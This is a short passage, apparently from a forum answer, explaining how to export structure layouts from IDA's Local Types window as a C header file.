<p>You can then open the ""<code>Local Type</code>s"" windows and dump all of the structure layouts as a C header file (right click ""<code>Export to header file</code>"". It still doesn't get you the assembly syntax you want, but it is about as close as I know how to make IDA get to what you want.</p>
